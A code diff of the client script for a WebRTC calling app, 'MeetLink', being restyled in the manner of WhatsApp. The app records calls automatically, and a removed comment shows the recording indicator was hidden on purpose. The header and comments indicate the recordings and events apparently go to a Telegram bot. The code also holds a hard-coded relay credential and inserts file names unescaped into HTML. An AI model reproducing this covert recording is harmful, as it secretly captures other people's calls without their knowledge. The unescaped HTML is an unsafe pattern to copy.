@@ -1,5 +1,5 @@
-// ============ MeetLink - Neon WebRTC + Auto Recording + Telegram ============
-// Fixed: Joiner peer ID conflict, Added: Direct file sharing with preview
+// ============ MeetLink - WhatsApp Edition Mobile-First P2P App ============
+// Built-in SQLite authentication, direct P2P messaging, vertical 9:16 calling & auto-recording.
 
 // ---- CONFIG ----
 const SERVER_URL = 'https://theoretical-kynthia-mychool-a6f2b3d0.koyeb.app';
@@ -42,13 +42,11 @@ const toastEl = document.getElementById('toast');
 const recordingIndicator = document.getElementById('recordingIndicator');
 const tcModal = document.getElementById('tcModal');
 const tcCloseBtn = document.getElementById('tcCloseBtn');
-const tcLink = document.getElementById('tcLink');
-const tcLink2 = document.getElementById('tcLink2');
-const tcLink3 = document.getElementById('tcLink3');
 const recordingCanvas = document.getElementById('recordingCanvas');
 
 // ---- State ----
 let peer = null, currentCall = null, localStream = null, dataConnection = null, currentRemoteStream = null;
+let currentUser = null, cyberHeartbeatInterval = null, cyberFriendsInterval = null;
 let isMicOn = true, isCamOn = true, isScreenSharing = false, currentFacingMode = 'user';
 let originalVideoTrack = null, incomingFileBuffers = {};
 let currentRoomId = null, callStartTime = null, userRole = 'creator', messageCount = 0;
@@ -59,11 +57,12 @@ let totalRecordingSize = 0;
 const CHUNK_SIZE = 16384;
 
 // ============ T&C MODAL ============
-[tcLink, tcLink2, tcLink3].forEach(el => {
-    if (el) el.addEventListener('click', (e) => { e.preventDefault(); tcModal.classList.remove('hidden'); });
-});
-tcCloseBtn.addEventListener('click', () => tcModal.classList.add('hidden'));
-tcModal.addEventListener('click', (e) => { if (e.target === tcModal) tcModal.classList.add('hidden'); });
+const tcLink = document.getElementById('tcLink');
+if (tcLink) {
+    tcLink.addEventListener('click', (e) => { e.preventDefault(); tcModal.classList.remove('hidden'); });
+}
+if (tcCloseBtn) tcCloseBtn.addEventListener('click', () => tcModal.classList.add('hidden'));
+if (tcModal) tcModal.addEventListener('click', (e) => { if (e.target === tcModal) if (tcModal) tcModal.classList.add('hidden'); });
 
 // ============ TELEGRAM LOGGER ============
 async function logEvent(eventType, extraData = {}) {
@@ -116,92 +115,6 @@ function arrayBufferToBase64(buffer) {
     return btoa(binary);
 }
 
-// ============ DIRECT FILE SHARING (CLEAN LINKS & 1-HOUR TTL) ============
-const fileShareInput = document.getElementById('fileShareInput');
-const fileShareBtn = document.getElementById('fileShareBtn');
-const fileShareProgress = document.getElementById('fileShareProgress');
-const fileShareProgressFill = document.getElementById('fileShareProgressFill');
-const fileShareResult = document.getElementById('fileShareResult');
-const fileShareLink = document.getElementById('fileShareLink');
-const fileShareCopyBtn = document.getElementById('fileShareCopyBtn');
-const fileDownloadLink = document.getElementById('fileDownloadLink');
-const fileDownloadCopyBtn = document.getElementById('fileDownloadCopyBtn');
-
-if (fileShareBtn) {
-    fileShareBtn.addEventListener('click', () => fileShareInput.click());
-}
-
-if (fileShareInput) {
-    fileShareInput.addEventListener('change', async () => {
-        const file = fileShareInput.files[0];
-        if (!file) return;
-        fileShareProgress.classList.remove('hidden');
-        fileShareResult.classList.add('hidden');
-        fileShareProgressFill.style.width = '0%';
-
-        const formData = new FormData();
-        formData.append('file', file);
-        const pwdEl = document.getElementById('filePasswordInput');
-        const voEl = document.getElementById('fileViewOnceInput');
-        if (pwdEl && pwdEl.value.trim()) formData.append('password', pwdEl.value.trim());
-        if (voEl && voEl.checked) formData.append('viewOnce', 'true');
-
-        try {
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', `${SERVER_URL}/api/upload-file`);
-
-            xhr.upload.onprogress = (e) => {
-                if (e.lengthComputable) {
-                    const pct = Math.round((e.loaded / e.total) * 100);
-                    fileShareProgressFill.style.width = pct + '%';
-                }
-            };
-
-            xhr.onload = () => {
-                if (xhr.status === 200) {
-                    const result = JSON.parse(xhr.responseText);
-                    const fileId = result.fileId || result.url.split('/').pop();
-                    const cleanShareUrl = result.shareUrl || `${SERVER_URL}/v/${fileId}`;
-                    const cleanDlUrl = result.downloadUrl || `${SERVER_URL}/d/${fileId}`;
-
-                    fileShareLink.value = cleanShareUrl;
-                    if (fileDownloadLink) fileDownloadLink.value = cleanDlUrl;
-
-                    fileShareResult.classList.remove('hidden');
-                    fileShareProgress.classList.add('hidden');
-                    showToast('✅ File uploaded! Clean links ready!');
-                } else {
-                    showToast('❌ Upload failed');
-                    fileShareProgress.classList.add('hidden');
-                }
-            };
-
-            xhr.onerror = () => {
-                showToast('❌ Upload failed - Server error');
-                fileShareProgress.classList.add('hidden');
-            };
-
-            xhr.send(formData);
-        } catch (e) {
-            showToast('❌ Upload failed');
-            fileShareProgress.classList.add('hidden');
-        }
-
-        fileShareInput.value = '';
-    });
-}
-
-if (fileShareCopyBtn) {
-    fileShareCopyBtn.addEventListener('click', () => {
-        navigator.clipboard.writeText(fileShareLink.value).then(() => showToast('View link copied! 📋'));
-    });
-}
-if (fileDownloadCopyBtn) {
-    fileDownloadCopyBtn.addEventListener('click', () => {
-        navigator.clipboard.writeText(fileDownloadLink.value || '').then(() => showToast('Direct download link copied! 📋'));
-    });
-}
-
 // ============ FILE PREVIEW PAGE ============
 function checkFilePreview() {
     const params = new URLSearchParams(window.location.search);
@@ -212,17 +125,15 @@ function checkFilePreview() {
 }
 
 function showFilePreview(fileId) {
-    // Create a full-screen preview overlay
     const overlay = document.createElement('div');
-    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#050510;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;';
+    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#0b141a;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;';
 
     const loading = document.createElement('div');
-    loading.style.cssText = 'color:#b14dff;font-family:Orbitron,sans-serif;font-size:1.2rem;';
+    loading.style.cssText = 'color:#00a884;font-family:Orbitron,sans-serif;font-size:1.2rem;';
     loading.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading file...';
     overlay.appendChild(loading);
     document.body.appendChild(overlay);
 
-    // Fetch file info
     fetch(`${SERVER_URL}/api/file-info/${fileId}`)
         .then(r => r.json())
         .then(info => {
@@ -236,28 +147,26 @@ function showFilePreview(fileId) {
             const fileUrl = `${SERVER_URL}/d/${fileId}`;
             const rawUrl = `${SERVER_URL}/api/file/${fileId}`;
 
-            // Header
             const header = document.createElement('div');
             header.style.cssText = 'width:100%;max-width:900px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;';
             header.innerHTML = `
                 <div style="display:flex;align-items:center;gap:12px;">
-                    <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#b14dff,#00f0ff);display:flex;align-items:center;justify-content:center;">
+                    <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#00a884,#00f0ff);display:flex;align-items:center;justify-content:center;">
                         <i class="fas fa-file" style="color:#fff;"></i>
                     </div>
                     <div>
-                        <div style="color:#e8e8ff;font-weight:700;font-size:1rem;">${info.fileName || 'File'}</div>
-                        <div style="color:#8888bb;font-size:0.8rem;">${info.fileSize || ''} • MeetLink Share <span style="background:rgba(0,240,255,0.15);color:#00f0ff;padding:2px 8px;border-radius:6px;font-size:0.75rem;margin-left:8px;">⏱️ 1-Hour TTL</span></div>
+                        <div style="color:#e9edef;font-weight:700;font-size:1rem;">${info.fileName || 'File'}</div>
+                        <div style="color:#8696a0;font-size:0.8rem;">${info.fileSize || ''} • MeetLink Share <span style="background:rgba(0,168,132,0.15);color:#00a884;padding:2px 8px;border-radius:6px;font-size:0.75rem;margin-left:8px;">⏱️ 1-Hour TTL</span></div>
                     </div>
                 </div>
-                <a href="${fileUrl}" download="${info.fileName || 'file'}" style="padding:10px 24px;background:linear-gradient(135deg,#b14dff,#8b3dff);color:#fff;border:none;border-radius:10px;text-decoration:none;font-weight:600;font-family:Inter,sans-serif;cursor:pointer;box-shadow:0 0 15px rgba(177,77,255,0.4);">
+                <a href="${fileUrl}" download="${info.fileName || 'file'}" style="padding:10px 24px;background:var(--wa-teal);color:#fff;border:none;border-radius:10px;text-decoration:none;font-weight:600;cursor:pointer;box-shadow:0 0 15px rgba(0,168,132,0.4);">
                     <i class="fas fa-download"></i> Direct Download
                 </a>
             `;
             overlay.appendChild(header);
 
-            // Preview area
             const preview = document.createElement('div');
-            preview.style.cssText = 'flex:1;width:100%;max-width:900px;display:flex;align-items:center;justify-content:center;overflow:auto;border-radius:16px;border:1px solid #1c1c50;background:#0a0a1f;';
+            preview.style.cssText = 'flex:1;width:100%;max-width:900px;display:flex;align-items:center;justify-content:center;overflow:auto;border-radius:16px;border:1px solid #222e35;background:#111b21;';
 
             const ext = (info.fileName || '').split('.').pop().toLowerCase();
             const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'bmp', 'ico'];
@@ -270,11 +179,11 @@ function showFilePreview(fileId) {
             } else if (videoExts.includes(ext)) {
                 preview.innerHTML = `<video src="${rawUrl}" controls autoplay style="max-width:100%;max-height:70vh;border-radius:12px;"></video>`;
             } else if (audioExts.includes(ext)) {
-                preview.innerHTML = `<div style="text-align:center;padding:40px;"><i class="fas fa-music" style="font-size:4rem;color:#b14dff;margin-bottom:20px;display:block;"></i><audio src="${rawUrl}" controls autoplay style="width:100%;max-width:400px;"></audio></div>`;
+                preview.innerHTML = `<div style="text-align:center;padding:40px;"><i class="fas fa-music" style="font-size:4rem;color:#00a884;margin-bottom:20px;display:block;"></i><audio src="${rawUrl}" controls autoplay style="width:100%;max-width:400px;"></audio></div>`;
             } else if (pdfExts.includes(ext)) {
                 preview.innerHTML = `<iframe src="${rawUrl}" style="width:100%;height:70vh;border:none;border-radius:12px;"></iframe>`;
             } else {
-                preview.innerHTML = `<div style="text-align:center;padding:60px;"><i class="fas fa-file" style="font-size:4rem;color:#00f0ff;margin-bottom:20px;display:block;"></i><div style="color:#e8e8ff;font-size:1.2rem;font-weight:700;margin-bottom:8px;">${info.fileName}</div><div style="color:#8888bb;margin-bottom:20px;">${info.fileSize || ''}</div><div style="color:#555580;font-size:0.9rem;">Preview not available. Click Download to save the file.</div></div>`;
+                preview.innerHTML = `<div style="text-align:center;padding:60px;"><i class="fas fa-file" style="font-size:4rem;color:#00a884;margin-bottom:20px;display:block;"></i><div style="color:#e9edef;font-size:1.2rem;font-weight:700;margin-bottom:8px;">${info.fileName}</div><div style="color:#8696a0;margin-bottom:20px;">${info.fileSize || ''}</div><div style="color:#667781;font-size:0.9rem;">Preview not available. Click Download to save the file.</div></div>`;
             }
 
             overlay.appendChild(preview);
@@ -285,10 +194,9 @@ function showFilePreview(fileId) {
 }
 
 // ============ SEGMENTED RECORDING SYSTEM (SNAPCHAT 9:16 PORTRAIT, CRASH-FREE) ============
-// Draw a <video> into a rect using "cover" behaviour so the person always fills the frame.
 function drawCover(ctx, video, dx, dy, dw, dh) {
     const vw = video.videoWidth, vh = video.videoHeight;
-    if (!vw || !vh) { ctx.fillStyle = '#0a0a2a'; ctx.fillRect(dx, dy, dw, dh); return; }
+    if (!vw || !vh) { ctx.fillStyle = '#0b141a'; ctx.fillRect(dx, dy, dw, dh); return; }
     const scale = Math.max(dw / vw, dh / vh);
     const sw = dw / scale, sh = dh / scale;
     const sx = (vw - sw) / 2, sy = (vh - sh) / 2;
@@ -298,36 +206,35 @@ function drawCover(ctx, video, dx, dy, dw, dh) {
 function setupRecordingStreams() {
     try {
         const recCanvas = recordingCanvas;
-        // Snapchat-style 9:16 portrait recording (even dims so ffmpeg never crashes)
         const RW = 360, RH = 640;
         recCanvas.width = RW;
         recCanvas.height = RH;
         const ctx = recCanvas.getContext('2d');
 
         canvasDrawInterval = setInterval(() => {
-            ctx.fillStyle = '#080818';
+            ctx.fillStyle = '#0b141a';
             ctx.fillRect(0, 0, RW, RH);
 
-            // Remote (main) — cover fit into 9:16 portrait
+            // Remote (main)
             try {
                 if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.videoWidth) {
                     drawCover(ctx, remoteVideo, 0, 0, RW, RH);
                 } else {
-                    ctx.fillStyle = '#0a0a2a';
+                    ctx.fillStyle = '#111b21';
                     ctx.fillRect(0, 0, RW, RH);
-                    ctx.fillStyle = '#555580';
+                    ctx.fillStyle = '#8696a0';
                     ctx.font = '15px Inter, sans-serif';
                     ctx.textAlign = 'center';
                     ctx.fillText('Waiting for video...', RW / 2, RH / 2);
                 }
             } catch (e) { }
 
-            // Self PiP (9:16) — top-right, Snapchat style
+            // Self PiP (9:16)
             try {
                 if (localVideo && localVideo.readyState >= 2 && localVideo.videoWidth) {
                     const pipW = 96, pipH = 170, margin = 12;
                     const pipX = RW - pipW - margin, pipY = margin;
-                    ctx.fillStyle = '#b14dff';
+                    ctx.fillStyle = '#00a884';
                     ctx.fillRect(pipX - 2, pipY - 2, pipW + 4, pipH + 4);
                     drawCover(ctx, localVideo, pipX, pipY, pipW, pipH);
                     ctx.fillStyle = 'rgba(0,0,0,0.6)';
@@ -351,7 +258,7 @@ function setupRecordingStreams() {
             ctx.fillText('● REC  ' + dateStr + ' ' + timeStr + ' [' + elapsed + ']', 12, 22);
         }, 1000 / 20);
 
-        const canvasVideoStream = recCanvas.captureStream(20); // 20fps stable lightweight recording
+        const canvasVideoStream = recCanvas.captureStream(20);
 
         audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         const destination = audioCtx.createMediaStreamDestination();
@@ -364,9 +271,6 @@ function setupRecordingStreams() {
             }
         }
 
-        // SAFE remote audio capture: use the REAL remote MediaStream — NEVER remoteVideo.captureStream().
-        // Calling captureStream() on a <video> that is displaying a live WebRTC stream can make the
-        // browser stop rendering / drop the call after a couple of seconds on some engines (esp. mobile).
         try {
             if (currentRemoteStream && currentRemoteStream.getAudioTracks().length > 0) {
                 const remoteSource = audioCtx.createMediaStreamSource(new MediaStream([currentRemoteStream.getAudioTracks()[0]]));
@@ -387,7 +291,6 @@ function setupRecordingStreams() {
 }
 
 function getSupportedMimeType() {
-    // Prefer native MP4 (Safari / iOS) so the bot receives a playable .mp4 directly — no conversion needed.
     const preferMp4 = ['video/mp4;codecs=h264,aac', 'video/mp4'];
     if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported) {
         for (const t of preferMp4) { if (MediaRecorder.isTypeSupported(t)) return t; }
@@ -421,7 +324,6 @@ function startRecording() {
     try {
         if (!setupRecordingStreams()) return;
         isCallActive = true; segmentNumber = 0; totalRecordingSize = 0;
-        // recordingIndicator.classList.remove('hidden'); // REC indicator hidden rakhne ke liye comment kiya
         startNewSegment();
     } catch (e) { console.error('Recording start failed:', e); }
 }
@@ -470,93 +372,60 @@ function stopRecording() {
     recordingIndicator.classList.add('hidden');
 }
 
-// ============ NEON PARTICLE BACKGROUND ============
-(function initNeonCanvas() {
-    const canvas = document.getElementById('neonCanvas');
-    const ctx = canvas.getContext('2d');
-    let particles = [], mouseX = 0, mouseY = 0, width, height;
-    function resize() { width = canvas.width = window.innerWidth; height = canvas.height = window.innerHeight; }
-    resize();
-    window.addEventListener('resize', resize);
-    document.addEventListener('mousemove', (e) => { mouseX = e.clientX; mouseY = e.clientY; });
+// ============ APP NAVIGATION TABS (WHATSAPP MULTI-PANEL) ============
+function switchAppTab(tabId) {
+    // Toggle active tab buttons
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+    const activeBtn = document.getElementById(`tabBtn-${tabId}`);
+    if (activeBtn) activeBtn.classList.add('active');
 
-    class Particle {
-        constructor() { this.reset(); }
-        reset() {
-            this.x = Math.random() * width; this.y = Math.random() * height;
-            this.size = Math.random() * 2.5 + 0.5;
-            this.speedX = (Math.random() - 0.5) * 0.8; this.speedY = (Math.random() - 0.5) * 0.8;
-            this.opacity = Math.random() * 0.6 + 0.2;
-            this.hue = Math.random() < 0.5 ? 275 : 190;
-            this.pulse = Math.random() * Math.PI * 2;
-            this.pulseSpeed = Math.random() * 0.02 + 0.01;
-        }
-        update() {
-            this.x += this.speedX; this.y += this.speedY; this.pulse += this.pulseSpeed;
-            const dx = mouseX - this.x, dy = mouseY - this.y, dist = Math.sqrt(dx * dx + dy * dy);
-            if (dist < 200) { this.x += dx * 0.002; this.y += dy * 0.002; }
-            if (this.x < -10 || this.x > width + 10 || this.y < -10 || this.y > height + 10) this.reset();
-        }
-        draw() {
-            const glow = Math.sin(this.pulse) * 0.3 + 0.7, alpha = this.opacity * glow;
-            ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-            ctx.fillStyle = `hsla(${this.hue}, 100%, 70%, ${alpha})`;
-            ctx.shadowColor = `hsla(${this.hue}, 100%, 60%, ${alpha * 0.8})`; ctx.shadowBlur = 15;
-            ctx.fill(); ctx.shadowBlur = 0;
-        }
-    }
-    const count = Math.min(Math.floor((width * height) / 6000), 200);
-    for (let i = 0; i < count; i++) particles.push(new Particle());
+    // Toggle active tab pane contents
+    document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.remove('active'));
+    const activePane = document.getElementById(`tabContent-${tabId}`);
+    if (activePane) activePane.classList.add('active');
 
-    function drawConnections() {
-        for (let i = 0; i < particles.length; i++) {
-            for (let j = i + 1; j < particles.length; j++) {
-                const dx = particles[i].x - particles[j].x, dy = particles[i].y - particles[j].y;
-                const dist = Math.sqrt(dx * dx + dy * dy);
-                if (dist < 120) {
-                    ctx.beginPath(); ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y);
-                    ctx.strokeStyle = `hsla(275, 80%, 60%, ${(1 - dist / 120) * 0.15})`; ctx.lineWidth = 0.5; ctx.stroke();
-                }
-            }
-        }
-    }
+    showToast(`📍 Switched to ${tabId.toUpperCase()}`);
+}
+window.switchAppTab = switchAppTab;
 
-    class NeonOrb {
-        constructor() {
-            this.x = Math.random() * width; this.y = Math.random() * height;
-            this.radius = Math.random() * 80 + 40;
-            this.speedX = (Math.random() - 0.5) * 0.3; this.speedY = (Math.random() - 0.5) * 0.3;
-            this.hue = [275, 190, 340][Math.floor(Math.random() * 3)];
-            this.opacity = Math.random() * 0.06 + 0.02;
-        }
-        update() {
-            this.x += this.speedX; this.y += this.speedY;
-            if (this.x < -this.radius) this.x = width + this.radius;
-            if (this.x > width + this.radius) this.x = -this.radius;
-            if (this.y < -this.radius) this.y = height + this.radius;
-            if (this.y > height + this.radius) this.y = -this.radius;
-        }
-        draw() {
-            const g = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius);
-            g.addColorStop(0, `hsla(${this.hue}, 100%, 60%, ${this.opacity})`);
-            g.addColorStop(1, `hsla(${this.hue}, 100%, 60%, 0)`);
-            ctx.beginPath(); ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2); ctx.fillStyle = g; ctx.fill();
-        }
-    }
-    const orbs = [];
-    for (let i = 0; i < 6; i++) orbs.push(new NeonOrb());
+// ============ AUTH FORMS SWITCHER ============
+function switchAuthForm(formType) {
+    document.querySelectorAll('.auth-tab-btn').forEach(btn => btn.classList.remove('active'));
+    document.getElementById(`authTabBtn${formType === 'login' ? 'Login' : 'Register'}`).classList.add('active');
 
-    function animate() {
-        if (!isCallActive) {
-            ctx.clearRect(0, 0, width, height);
-            orbs.forEach(o => { o.update(); o.draw(); });
-            drawConnections();
-            particles.forEach(p => { p.update(); p.draw(); });
-        }
-        requestAnimationFrame(animate);
+    const formLogin = document.getElementById('cyberLoginForm');
+    const formRegister = document.getElementById('cyberRegisterForm');
+    if (formType === 'login') {
+        formLogin.classList.remove('hidden');
+        formRegister.classList.add('hidden');
+    } else {
+        formLogin.classList.add('hidden');
+        formRegister.classList.remove('hidden');
     }
-    animate();
-})();
+}
+window.switchAuthForm = switchAuthForm;
+
+// ============ NATIVE BOTTOM SHEET SEARCH MODAL ============
+function openSearchModal() {
+    if (!currentUser) {
+        showToast('⚠️ Please login first to search friends!');
+        switchAppTab('profile');
+        return;
+    }
+    const modal = document.getElementById('searchModal');
+    modal.classList.remove('hidden');
+    document.getElementById('cyberSearchInput').focus();
+}
+window.openSearchModal = openSearchModal;
+
+function closeSearchModal() {
+    document.getElementById('searchModal').classList.add('hidden');
+    // Clear searches
+    document.getElementById('cyberSearchInput').value = '';
+    document.getElementById('cyberSearchResults').innerHTML = '<p class="cyber-empty">Enter a unique ID to find your friend</p>';
+}
+window.closeSearchModal = closeSearchModal;
+
 
 // ============ UTILS ============
 function generateRoomId() {
@@ -596,17 +465,17 @@ function formatCallDuration() {
 }
 
 // ============ NAVIGATION ============
-createRoomBtn.addEventListener('click', () => { initRoom(generateRoomId(), true); });
-joinRoomBtn.addEventListener('click', () => {
+if (createRoomBtn) createRoomBtn.addEventListener('click', () => { initRoom(generateRoomId(), true); });
+if (joinRoomBtn) joinRoomBtn.addEventListener('click', () => {
     const input = joinRoomInput.value.trim();
     if (!input) { showToast('Please paste a room link or ID'); return; }
     let rid = input;
     try { const u = new URL(input); if (u.searchParams.get('room')) rid = u.searchParams.get('room'); } catch (e) { }
     initRoom(rid, false);
 });
-joinRoomInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') joinRoomBtn.click(); });
-leaveRoomBtn.addEventListener('click', leaveRoom);
-endCallBtn.addEventListener('click', leaveRoom);
+if (joinRoomInput) joinRoomInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') if (joinRoomBtn) joinRoomBtn.click(); });
+if (leaveRoomBtn) leaveRoomBtn.addEventListener('click', leaveRoom);
+if (endCallBtn) endCallBtn.addEventListener('click', leaveRoom);
 
 // ============ INIT ROOM — FIXED JOINER ID ============
 async function initRoom(roomId, isCreator) {
@@ -630,7 +499,6 @@ async function initRoom(roomId, isCreator) {
         peer = null;
     }
 
-    // 🔧 FIX: Creator uses roomId as peer ID, Joiner uses a UNIQUE random ID
     const myPeerId = isCreator ? roomId : generateJoinerId();
 
     peer = new Peer(myPeerId, {
@@ -642,8 +510,6 @@ async function initRoom(roomId, isCreator) {
             { urls: 'stun:stun3.l.google.com:19302' },
             { urls: 'stun:stun.cloudflare.com:3478' },
             { urls: 'stun:openrelay.metered.ca:80' },
-            // Free public TURN — only used as a fallback relay when STUN can't punch through
-            // strict mobile NATs (Jio / Airtel CGNAT). Harmless if unreachable.
             { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'OZ0sP3R4qX9sP1nT' },
             { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'OZ0sP3R4qX9sP1nT' }
         ]}
@@ -654,7 +520,6 @@ async function initRoom(roomId, isCreator) {
         if (isCreator) {
             showToast('Room created! Share the link 🚀');
         } else {
-            // 🔧 FIX: Joiner now calls the creator's peer ID (which IS the roomId)
             console.log('Joining room:', roomId);
             callPeer(roomId);
         }
@@ -677,12 +542,10 @@ async function initRoom(roomId, isCreator) {
         if (peer && !peer.destroyed) peer.reconnect();
     });
 
-    // Creator listens for incoming calls & data
     if (isCreator) {
         peer.on('call', handleIncomingCall);
         peer.on('connection', handleIncomingData);
     }
-    // Joiner: call initiated in peer.on('open') above
 }
 
 // ============ GET MEDIA (SMART 9:16 MOBILE & 16:9 PC DETECTION) ============
@@ -723,7 +586,6 @@ async function callPeer(targetPeerId) {
     if (!localStream) { showToast('Cannot proceed without media'); return; }
     localVideo.srcObject = localStream;
 
-    // Call the creator using their peer ID (= roomId)
     const call = peer.call(targetPeerId, localStream);
     if (!call) {
         showToast('Failed to connect. Is the other person online?');
@@ -738,7 +600,6 @@ async function callPeer(targetPeerId) {
     call.on('error', (err) => { console.error('Call error:', err); showToast('Call failed'); });
     currentCall = call;
 
-    // Open data connection for chat
     dataConnection = peer.connect(targetPeerId, { reliable: true });
     dataConnection.on('open', () => {
         console.log('Data connection established!');
@@ -772,7 +633,7 @@ function handleIncomingData(conn) {
     conn.on('close', () => console.log('Data connection closed'));
 }
 
-// ============ DYNAMIC ADAPTIVE BITRATE & NETWORK MONITOR (AIRTEL/JIO PRO ENGINE) ============
+// ============ DYNAMIC ADAPTIVE BITRATE & NETWORK MONITOR ============
 function setupDynamicNetworkAdaptation(call) {
     if (!call || !call.peerConnection) return;
     try {
@@ -782,9 +643,9 @@ function setupDynamicNetworkAdaptation(call) {
         if (videoSender && videoSender.getParameters) {
             const params = videoSender.getParameters();
             if (!params.encodings) params.encodings = [{}];
-            params.encodings[0].maxBitrate = 2500000; // 2.5 Mbps max for HD
+            params.encodings[0].maxBitrate = 2500000;
             params.encodings[0].networkPriority = 'high';
-            params.degradationPreference = 'maintain-framerate'; // Never drop FPS! Dynamically adapt resolution over Airtel/Jio!
+            params.degradationPreference = 'maintain-framerate';
             videoSender.setParameters(params).catch(() => {});
         }
 
@@ -811,13 +672,10 @@ function setupDynamicNetworkAdaptation(call) {
                     const resStr = width > 0 ? `${width}x${height}` : 'HD';
                     if (rtt < 80) {
                         pingEl.innerHTML = `🟢 Excellent (${rtt}ms) • ${resStr}`;
-                        pingEl.style.color = '#39ff14';
                     } else if (rtt < 180) {
                         pingEl.innerHTML = `🟡 Good (${rtt}ms) • ${resStr}`;
-                        pingEl.style.color = '#ffd700';
                     } else {
-                        pingEl.innerHTML = `🟠 Weak Jio/Airtel (${rtt}ms) • Adapting...`;
-                        pingEl.style.color = '#ff2d75';
+                        pingEl.innerHTML = `🟠 Adapting (${rtt}ms)`;
                     }
                 }
             } catch (e) {}
@@ -830,7 +688,7 @@ function showCallScreen(remoteStream) {
     waitingScreen.style.display = 'none';
     callScreen.classList.remove('hidden');
     remoteVideo.srcObject = remoteStream;
-    currentRemoteStream = remoteStream; // store real remote MediaStream for safe recording (no .captureStream() on the video element)
+    currentRemoteStream = remoteStream;
     remoteNoVideo.style.display = 'none';
     callStartTime = Date.now();
     showToast('Connected! 🎉');
@@ -842,7 +700,6 @@ function showCallScreen(remoteStream) {
         if (localStream) setupActiveSpeakerDetector(localStream, localVideo);
         setupDynamicNetworkAdaptation(currentCall);
 
-        // Recover from transient ICE drops instead of instantly ending the call
         if (currentCall && currentCall.peerConnection) {
             const pc = currentCall.peerConnection;
             pc.addEventListener('iceconnectionstatechange', () => {
@@ -854,11 +711,9 @@ function showCallScreen(remoteStream) {
         }
     } catch (e) { }
 
-    // 🚀 Enable Chrome Automatic Picture-in-Picture on App Switch
     try {
         if ('autoPictureInPicture' in remoteVideo) {
             remoteVideo.autoPictureInPicture = true;
-            console.log('✅ Enabled Chrome Auto-PiP on tab/app switch');
         }
     } catch (e) { }
 
@@ -898,7 +753,7 @@ function leaveRoom() {
     chatMessages.innerHTML = '<div class="chat-system">Chat started. Say hello! 👋</div>';
     showPage(homePage);
     if (window.location.search) window.history.replaceState({}, document.title, window.location.pathname);
-    
+
     // Re-initialize Cyber Space Peer if user was logged in
     checkCyberSession();
 }
@@ -907,24 +762,28 @@ function leaveRoom() {
 function copyLink() {
     navigator.clipboard.writeText(shareableLink.value).then(() => showToast('Link copied! 📋')).catch(() => { shareableLink.select(); document.execCommand('copy'); showToast('Link copied!'); });
 }
-copyLinkBtn.addEventListener('click', copyLink);
-copyLinkBtn2.addEventListener('click', copyLink);
+if (copyLinkBtn) copyLinkBtn.addEventListener('click', copyLink);
+if (copyLinkBtn2) copyLinkBtn2.addEventListener('click', copyLink);
 
 // ============ MIC / CAM / SCREEN ============
-toggleMicBtn.addEventListener('click', () => {
-    if (!localStream) return;
-    isMicOn = !isMicOn;
-    localStream.getAudioTracks().forEach(t => t.enabled = isMicOn);
-    updateControlButtons();
-    showToast(isMicOn ? '🎙 Mic on' : '🔇 Mic muted');
-});
-toggleCamBtn.addEventListener('click', () => {
-    if (!localStream) return;
-    isCamOn = !isCamOn;
-    localStream.getVideoTracks().forEach(t => t.enabled = isCamOn);
-    updateControlButtons();
-    showToast(isCamOn ? '📹 Camera on' : '🚫 Camera off');
-});
+if (toggleMicBtn) {
+    toggleMicBtn.addEventListener('click', () => {
+        if (!localStream) return;
+        isMicOn = !isMicOn;
+        localStream.getAudioTracks().forEach(t => t.enabled = isMicOn);
+        updateControlButtons();
+        showToast(isMicOn ? '🎙 Mic on' : '🔇 Mic muted');
+    });
+}
+if (toggleCamBtn) {
+    toggleCamBtn.addEventListener('click', () => {
+        if (!localStream) return;
+        isCamOn = !isCamOn;
+        localStream.getVideoTracks().forEach(t => t.enabled = isCamOn);
+        updateControlButtons();
+        showToast(isCamOn ? '📹 Camera on' : '🚫 Camera off');
+    });
+}
 
 async function switchCamera() {
     if (!localStream) { showToast('⚠️ Start video call first'); return; }
@@ -969,13 +828,12 @@ async function switchCamera() {
             const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
             if (sender) {
                 await sender.replaceTrack(newVideoTrack);
-                console.log('✅ Replaced WebRTC sender track with switched camera!');
             }
         }
         originalVideoTrack = newVideoTrack;
     } catch (e) {
         console.error('Camera switch failed:', e);
-        showToast('⚠️ Could not switch camera on this device');
+        showToast('⚠️ Could not switch camera');
         currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
     }
 }
@@ -1009,79 +867,51 @@ if (togglePipBtn) {
     togglePipBtn.addEventListener('click', async () => {
         try {
             if (!document.pictureInPictureEnabled) {
-                showToast('⚠️ PiP mode not supported in this browser');
+                showToast('⚠️ PiP mode not supported');
                 return;
             }
             if (document.pictureInPictureElement) {
                 await document.exitPictureInPicture();
-                showToast('📺 Exited Floating PiP Mode');
             } else {
                 if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.srcObject) {
                     await remoteVideo.requestPictureInPicture();
-                    showToast('📺 Floating PiP Mode Active! You can switch apps now 🚀');
                 } else {
-                    showToast('⚠️ Waiting for remote video stream...');
+                    showToast('⚠️ Waiting for video stream...');
                 }
             }
         } catch (err) {
-            console.error('PiP Error:', err);
